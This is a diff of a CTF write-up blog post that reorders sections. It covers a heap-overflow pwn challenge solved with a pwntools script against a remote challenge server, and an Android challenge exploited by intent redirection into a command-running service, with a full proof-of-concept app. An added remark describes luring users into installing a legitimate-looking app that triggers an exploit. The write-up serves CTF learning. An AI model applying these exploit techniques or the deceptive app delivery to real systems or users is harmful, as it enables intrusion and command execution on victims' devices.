@@ -7,7 +7,155 @@ description: "A special CTF from P3rf3ctr00t"
 useRelativeCover: true
 categories: [Capture The Flag]
 ---
+
+# PWN
+## Heap wars
+![img-desc](8.png)
+
+Lets decompile the code in binary ninja. The code allocates dynamic memory of size`64` bytes in the heap for the `char* rax_2`.
+It also allocates `8` bytes for a function `int64_t (** rax_3)()` and initialy sets it to `darthVader`.
+
+```c
+004012f9  int32_t main(int32_t argc, char** argv, char** envp)
+              ....
+0040132f      char* rax_2 = malloc(bytes: 64)
+00401340      int64_t (** rax_3)() = malloc(bytes: 8)
+00401353      *rax_3 = darthVader
+```
+
+```c
+00401287  int64_t darthVader()
+00401297      return puts(str: "You have not mastered the Force.")
+```
+
+The binary runs a while loop to allow user change different modes. The first mode `1. Enter your Jedi code` requires a user to 
+enter a code of size `256` bytes and copies it to `rax_2` which is of size `64` hence a buffer overflow. It also prints the function
+at `(*rax_3)()`
+
+```c
+            ....
+004013f8    else if (rax_8 == 1)
+00401424        printf(format: "Enter your Jedi code: ")
+00401429        getchar()
+0040144c        void buf
+0040144c                  
+0040144c        if (fgets(&buf, n: 256, fp: stdin) == 0)
+00401453            perror(s: "Error reading input")
+0040145d            exit(status: 1)
+0040145d            noreturn
+0040145d                  
+00401476        strcpy(rax_2, &buf)
+00401482        (*rax_3)()
+00401491        puts(str: "Jedi code saved.")
+00401496        continue
+            ....
+```
+
+the next option `2. Jedi data` prints a pointer to `rax_2` in the heap.
+
+```c
+            ...        
+0040140a    else if (rax_8 == 2)
+004014ac        printf(format: "Jedi data: %p\n", rax_2)
+004014b1        continue
+            ...
+```
+
+The other option `3. Jedi next bounty` prints a pointer to function `rax_3` in the heap.
+
+```c
+            ...
+004013e6    else
+004013f8        if (rax_8 == 3)
+004014c7            printf(format: "Jedi bounty: %p\n", rax_3)
+004014cc            continue
+            ...
+```
+
+We also have a function `theForce()` that prints the flag content.
+
+```c
+00401216  int64_t theForce()
+
+00401228      FILE* fp = fopen(filename: "flag.txt", mode: &data_402008)
+00401228      
+00401236      if (fp == 0)
+0040123d          perror(s: "Error opening flag.txt. Contact …")
+00401247          exit(status: 1)
+00401247          noreturn
+00401247      
+00401251      puts(str: "Flag content:")
+00401251      
+0040126a      while (true)
+0040126a          char rax_2 = fgetc(fp)
+0040126a          
+00401276          if (rax_2 == 0xff)
+00401276              break
+00401276          
+0040125e          putchar(c: sx.d(rax_2))
+0040125e      
+00401286      return fclose(fp)
+```
+
+Finally what we have to do is calculate the distance between `rax_2` and `rax_3` then overwrite `rax_3` with the address of 
+`theForce()` function using the buffer overflow. Since the pointers are leaked all we have to do is 
+`int_function_address - int_data_address` to get the offset.
+
+```python
+from pwn import *
+
+filename = "./challenge/challenge/heap_wars"
+
+elf = ELF(filename)
+#context.log_level = 'debug'
+context.binary = elf
+
+# p = process(filename)
+
+p = remote('94.72.112.248', 1337)
+
+p.recvuntil(b'Enter your choice:')
+p.sendline(b'2')
+p.recvuntil(b"Jedi data: ")
+data_address = p.recvline()
+int_data_address = int(data_address.strip(), 16)
+
+p.recvuntil(b'Enter your choice:')
+p.sendline(b'3')
+p.recvuntil(b"Jedi bounty: ")
+function_address = p.recvline()
+int_function_address = int(function_address.strip(), 16)
+
+the_force_function_address = elf.symbols['theForce']
+
+padding = b'A' * (int_function_address - int_data_address)
+payload = padding + p64(the_force_function_address)
+
+p.recvuntil(b'Enter your choice:')
+p.sendline(b'1')
+p.recvuntil(b'Enter your Jedi code:')
+p.sendline(payload)
+
+p.interactive()
+```
+
+Finally we run our exploit and get the flag.
+
+```bash
+python exploit.py
+...
+[+] Opening connection to 94.72.112.248 on port 1337: Done
+[*] Switching to interactive mode
+ Flag content:
+r00t{h34p_0v3rfl0w_1n_th3_f0rc3_1ebfe9e04a01ac4b00d4bd194b1bd505}Jedi code saved.
+...
+Enter your choice: $
+```
+
 # Android
+
+> For challenges that need a proof of concept (POC), I expected you to create an app and share the relevant code. The reason is simple: to exploit another Android app, you can’t rely on convincing a user to run ADB commands on their device. However, you can persuade them to install a legitimate-looking app from the Google Play Store and click a button that triggers the exploit.
+
 ## Dash
 
 ![img-description](1.png)
@@ -369,161 +517,6 @@ We run our exploit and click the button and the `ls` commands runs successfuly.
 
 ![img-description](4_5.png)
 
-## Hunter X Hunter
-
-![img-description](5.png)
-
-Opening the apk we get this screen.
-
-![img-description](5_0.png)
-
-In the `AndroidManifest.xml` file we notice `HuntersPortal` is not exported, meaning it can't be launched by other apps. `HuntersService` is enabled but not exported, so it can only be used internally within the app. `MainActivity` has two intent filters, one for launching the app and one for handling `VIEW` intents from other apps.
-
-```xml
-    ...
-28  <activity
-29	    android:name="com.example.hunterx.HuntersPortal"
-30	    android:exported="false"/>
-31  <service
-32	    android:name="com.example.hunterx.HuntersService"
-33	    android:enabled="true"
-34	    android:exported="false"/>
-35  <activity
-36	    android:name="com.example.hunterx.MainActivity"
-37	    android:exported="true">
-38	    <intent-filter>
-39	        <action android:name="android.intent.action.MAIN"/>
-40	        <category android:name="android.intent.category.LAUNCHER"/>
-41	    </intent-filter>
-42	    <intent-filter>
-43	        <action android:name="android.intent.action.VIEW"/>
-44	        <category android:name="android.intent.category.DEFAULT"/>
-45	    </intent-filter>
-46  </activity>
-    ...
-```
-
-MainActivity retrieves the incoming intent with `getIntent()` and checks if it contains an `action` and a parcelable 
-extra named `nextIntent`. If both conditions are met, it starts a new activity `startActivity()` using the Intent object 
-stored in the `nextIntent` extra hence an Intent redirection vulnerability.
-
-```java
-    ...
-16	public class MainActivity extends AbstractActivityC0156j {
-       ...	
-23	   @Override
-24	   public void onCreate(Bundle bundle) {
-           ...
-32	       Intent intent = getIntent();
-33	       if (intent.getAction() != null && intent.getParcelableExtra("nextIntent") != null) {
-34	           startActivity((Intent) intent.getParcelableExtra("nextIntent"));
-35	       }
-36	   }
-37	}
-```
-
-The `HuntersPortal` activity retrieves the incoming intent using `getIntent()`, checks if the `action` is `ProHunter`, 
-and if so, updates the `TextView` and also starts a service `startService()` using the `nextIntent` parcelable extra from 
-the intent hence another Intent redirection vulnerability.
-
-```java
-    ...
-17	public class HuntersPortal extends AbstractActivityC0156j {
-       ...
-24	   @Override
-25	   public void onCreate(Bundle bundle) {
-           ...
-34	       Intent intent = getIntent();
-35	       String action = intent.getAction();
-36	       if (action != null && action.equals("ProHunter")) {
-37	           textView.setText("This is the way of the Pro Hunters");
-38	           startService((Intent) intent.getParcelableExtra("nextIntent"));
-39	       }
-40	   }
-41	}
-```
-`HuntersService` service `onStartCommand()` function checks for an incoming intent with the extra `run` and decodes its Base64 string to execute it as a command. It starts a new thread to run the command, processes its output, and logs the results while showing a success toast.
-
-```java
-    ...
-17	public class HuntersService extends Service {
-91	   @Override
-92	   public int onStartCommand(Intent intent, int i2, int i3) {
-93	       Log.d("ill make sure i remove this in the production", "onStartCommand: ");
-94	       if (intent != null && intent.getStringExtra("run") != null) {
-95	           try {
-96	               int i4 = 5;
-97	               new Thread(new o(this, i4, Runtime.getRuntime().exec(new String(Base64.decode(intent.getStringExtra("run"), 0)).trim()))).start();
-98	               return 1;
-99	           } catch (IOException e2) {
-                   ...
-102	           }
-103	       }
-104	       return 1;
-105	   }
-106	}
-```
-
-Lets now create our poc apk to run a command.
-
-```java
-package com.example.hunterxsolution;
-
-import android.content.Intent;
-import android.os.Bundle;
-import android.widget.Button;
-
-import androidx.activity.EdgeToEdge;
-import androidx.appcompat.app.AppCompatActivity;
-import androidx.core.graphics.Insets;
-import androidx.core.view.ViewCompat;
-import androidx.core.view.WindowInsetsCompat;
-
-public class MainActivity extends AppCompatActivity {
-
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        EdgeToEdge.enable(this);
-        setContentView(R.layout.activity_main);
-        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
-            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
-            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
-            return insets;
-        });
-
-        // create an intent to call the internal service component
-        Intent serviceIntent = new Intent();
-        serviceIntent.setClassName("com.example.hunterx", "com.example.hunterx.HuntersService");
-        serviceIntent.putExtra("run", "bHM=");
-
-        // Create an intent to call the unexported hunters portal activity using intent redirection
-        Intent proHunterIntent = new Intent();
-        proHunterIntent.setAction("ProHunter");
-        proHunterIntent.setClassName("com.example.hunterx", "com.example.hunterx.HuntersPortal");
-
-        // pass the serviceIntent as the next intent
-        proHunterIntent.putExtra("nextIntent", serviceIntent);
-
-        // create our main intent with the correct action
-        Intent intent = new Intent();
-        intent.setAction(Intent.ACTION_VIEW);
-        intent.setClassName("com.example.hunterx", "com.example.hunterx.MainActivity");
-
-        // pass the proHunterIntent as the next intent
-        intent.putExtra("nextIntent", proHunterIntent);
-
-        // create a button to trigger the exploit
-        Button button = findViewById(R.id.button);
-        button.setOnClickListener(v -> startActivity(intent));
-    }
-}
-```
-
-We run the exploit and click the button to trigger the exploit. Intent redirection allowed us to access unexported components.
-
-![img-description](5_5.png)
-
 ## Uncharted Path
 
 ![img-description](6.png)
@@ -858,146 +851,161 @@ Running the app with the new code we finnally get our flag;
 
 The flag was hardcoded in the game, allowing it to be retrieved easily without completing the intended steps. However, that wasn’t my goal when designing the challenge; and yet, no one managed to solve it.
 
-# PWN
-## Heap wars
-![img-desc](8.png)
+## Hunter X Hunter
 
-Lets decompile the code in binary ninja. The code allocates dynamic memory of size`64` bytes in the heap for the `char* rax_2`.
-It also allocates `8` bytes for a function `int64_t (** rax_3)()` and initialy sets it to `darthVader`.
+![img-description](5.png)
 
-```c
-004012f9  int32_t main(int32_t argc, char** argv, char** envp)
-              ....
-0040132f      char* rax_2 = malloc(bytes: 64)
-00401340      int64_t (** rax_3)() = malloc(bytes: 8)
-00401353      *rax_3 = darthVader
+Opening the apk we get this screen.
+
+![img-description](5_0.png)
+
+In the `AndroidManifest.xml` file we notice `HuntersPortal` is not exported, meaning it can't be launched by other apps. `HuntersService` is enabled but not exported, so it can only be used internally within the app. `MainActivity` has two intent filters, one for launching the app and one for handling `VIEW` intents from other apps.
+
+```xml
+    ...
+28  <activity
+29	    android:name="com.example.hunterx.HuntersPortal"
+30	    android:exported="false"/>
+31  <service
+32	    android:name="com.example.hunterx.HuntersService"
+33	    android:enabled="true"
+34	    android:exported="false"/>
+35  <activity
+36	    android:name="com.example.hunterx.MainActivity"
+37	    android:exported="true">
+38	    <intent-filter>
+39	        <action android:name="android.intent.action.MAIN"/>
+40	        <category android:name="android.intent.category.LAUNCHER"/>
+41	    </intent-filter>
+42	    <intent-filter>
+43	        <action android:name="android.intent.action.VIEW"/>
+44	        <category android:name="android.intent.category.DEFAULT"/>
+45	    </intent-filter>
+46  </activity>
+    ...
 ```
 
-```c
-00401287  int64_t darthVader()
-00401297      return puts(str: "You have not mastered the Force.")
+MainActivity retrieves the incoming intent with `getIntent()` and checks if it contains an `action` and a parcelable 
+extra named `nextIntent`. If both conditions are met, it starts a new activity `startActivity()` using the Intent object 
+stored in the `nextIntent` extra hence an Intent redirection vulnerability.
+
+```java
+    ...
+16	public class MainActivity extends AbstractActivityC0156j {
+       ...	
+23	   @Override
+24	   public void onCreate(Bundle bundle) {
+           ...
+32	       Intent intent = getIntent();
+33	       if (intent.getAction() != null && intent.getParcelableExtra("nextIntent") != null) {
+34	           startActivity((Intent) intent.getParcelableExtra("nextIntent"));
+35	       }
+36	   }
+37	}
 ```
 
-The binary runs a while loop to allow user change different modes. The first mode `1. Enter your Jedi code` requires a user to 
-enter a code of size `256` bytes and copies it to `rax_2` which is of size `64` hence a buffer overflow. It also prints the function
-at `(*rax_3)()`
+The `HuntersPortal` activity retrieves the incoming intent using `getIntent()`, checks if the `action` is `ProHunter`, 
+and if so, updates the `TextView` and also starts a service `startService()` using the `nextIntent` parcelable extra from 
+the intent hence another Intent redirection vulnerability.
 
-```c
-            ....
-004013f8    else if (rax_8 == 1)
-00401424        printf(format: "Enter your Jedi code: ")
-00401429        getchar()
-0040144c        void buf
-0040144c                  
-0040144c        if (fgets(&buf, n: 256, fp: stdin) == 0)
-00401453            perror(s: "Error reading input")
-0040145d            exit(status: 1)
-0040145d            noreturn
-0040145d                  
-00401476        strcpy(rax_2, &buf)
-00401482        (*rax_3)()
-00401491        puts(str: "Jedi code saved.")
-00401496        continue
-            ....
+```java
+    ...
+17	public class HuntersPortal extends AbstractActivityC0156j {
+       ...
+24	   @Override
+25	   public void onCreate(Bundle bundle) {
+           ...
+34	       Intent intent = getIntent();
+35	       String action = intent.getAction();
+36	       if (action != null && action.equals("ProHunter")) {
+37	           textView.setText("This is the way of the Pro Hunters");
+38	           startService((Intent) intent.getParcelableExtra("nextIntent"));
+39	       }
+40	   }
+41	}
+```
+`HuntersService` service `onStartCommand()` function checks for an incoming intent with the extra `run` and decodes its Base64 string to execute it as a command. It starts a new thread to run the command, processes its output, and logs the results while showing a success toast.
+
+```java
+    ...
+17	public class HuntersService extends Service {
+91	   @Override
+92	   public int onStartCommand(Intent intent, int i2, int i3) {
+93	       Log.d("ill make sure i remove this in the production", "onStartCommand: ");
+94	       if (intent != null && intent.getStringExtra("run") != null) {
+95	           try {
+96	               int i4 = 5;
+97	               new Thread(new o(this, i4, Runtime.getRuntime().exec(new String(Base64.decode(intent.getStringExtra("run"), 0)).trim()))).start();
+98	               return 1;
+99	           } catch (IOException e2) {
+                   ...
+102	           }
+103	       }
+104	       return 1;
+105	   }
+106	}
 ```
 
-the next option `2. Jedi data` prints a pointer to `rax_2` in the heap.
+Lets now create our poc apk to run a command.
 
-```c
-            ...        
-0040140a    else if (rax_8 == 2)
-004014ac        printf(format: "Jedi data: %p\n", rax_2)
-004014b1        continue
-            ...
+```java
+package com.example.hunterxsolution;
+
+import android.content.Intent;
+import android.os.Bundle;
+import android.widget.Button;
+
+import androidx.activity.EdgeToEdge;
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.graphics.Insets;
+import androidx.core.view.ViewCompat;
+import androidx.core.view.WindowInsetsCompat;
+
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        EdgeToEdge.enable(this);
+        setContentView(R.layout.activity_main);
+        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
+            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
+            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
+            return insets;
+        });
+
+        // create an intent to call the internal service component
+        Intent serviceIntent = new Intent();
+        serviceIntent.setClassName("com.example.hunterx", "com.example.hunterx.HuntersService");
+        serviceIntent.putExtra("run", "bHM=");
+
+        // Create an intent to call the unexported hunters portal activity using intent redirection
+        Intent proHunterIntent = new Intent();
+        proHunterIntent.setAction("ProHunter");
+        proHunterIntent.setClassName("com.example.hunterx", "com.example.hunterx.HuntersPortal");
+
+        // pass the serviceIntent as the next intent
+        proHunterIntent.putExtra("nextIntent", serviceIntent);
+
+        // create our main intent with the correct action
+        Intent intent = new Intent();
+        intent.setAction(Intent.ACTION_VIEW);
+        intent.setClassName("com.example.hunterx", "com.example.hunterx.MainActivity");
+
+        // pass the proHunterIntent as the next intent
+        intent.putExtra("nextIntent", proHunterIntent);
+
+        // create a button to trigger the exploit
+        Button button = findViewById(R.id.button);
+        button.setOnClickListener(v -> startActivity(intent));
+    }
+}
 ```
 
-The other option `3. Jedi next bounty` prints a pointer to function `rax_3` in the heap.
+We run the exploit and click the button to trigger the exploit. Intent redirection allowed us to access unexported components.
 
-```c
-            ...
-004013e6    else
-004013f8        if (rax_8 == 3)
-004014c7            printf(format: "Jedi bounty: %p\n", rax_3)
-004014cc            continue
-            ...
-```
+![img-description](5_5.png)
 
-We also have a function `theForce()` that prints the flag content.
+Until next time, keep running… preferably toward more flags and fewer debugging nightmares!
 
-```c
-00401216  int64_t theForce()
-
-00401228      FILE* fp = fopen(filename: "flag.txt", mode: &data_402008)
-00401228      
-00401236      if (fp == 0)
-0040123d          perror(s: "Error opening flag.txt. Contact …")
-00401247          exit(status: 1)
-00401247          noreturn
-00401247      
-00401251      puts(str: "Flag content:")
-00401251      
-0040126a      while (true)
-0040126a          char rax_2 = fgetc(fp)
-0040126a          
-00401276          if (rax_2 == 0xff)
-00401276              break
-00401276          
-0040125e          putchar(c: sx.d(rax_2))
-0040125e      
-00401286      return fclose(fp)
-```
-
-Finally what we have to do is calculate the distance between `rax_2` and `rax_3` then overwrite `rax_3` with the address of 
-`theForce()` function using the buffer overflow. Since the pointers are leaked all we have to do is 
-`int_function_address - int_data_address` to get the offset.
-
-```python
-from pwn import *
-
-filename = "./challenge/challenge/heap_wars"
-
-elf = ELF(filename)
-#context.log_level = 'debug'
-context.binary = elf
-
-# p = process(filename)
-
-p = remote('94.72.112.248', 1337)
-
-p.recvuntil(b'Enter your choice:')
-p.sendline(b'2')
-p.recvuntil(b"Jedi data: ")
-data_address = p.recvline()
-int_data_address = int(data_address.strip(), 16)
-
-p.recvuntil(b'Enter your choice:')
-p.sendline(b'3')
-p.recvuntil(b"Jedi bounty: ")
-function_address = p.recvline()
-int_function_address = int(function_address.strip(), 16)
-
-the_force_function_address = elf.symbols['theForce']
-
-padding = b'A' * (int_function_address - int_data_address)
-payload = padding + p64(the_force_function_address)
-
-p.recvuntil(b'Enter your choice:')
-p.sendline(b'1')
-p.recvuntil(b'Enter your Jedi code:')
-p.sendline(payload)
-
-p.interactive()
-```
-
-Finally we run our exploit and get the flag.
-
-```bash
-python exploit.py
-...
-[+] Opening connection to 94.72.112.248 on port 1337: Done
-[*] Switching to interactive mode
- Flag content:
-r00t{h34p_0v3rfl0w_1n_th3_f0rc3_1ebfe9e04a01ac4b00d4bd194b1bd505}Jedi code saved.
-...
-Enter your choice: $
-```
+![yay](hunterx.gif)
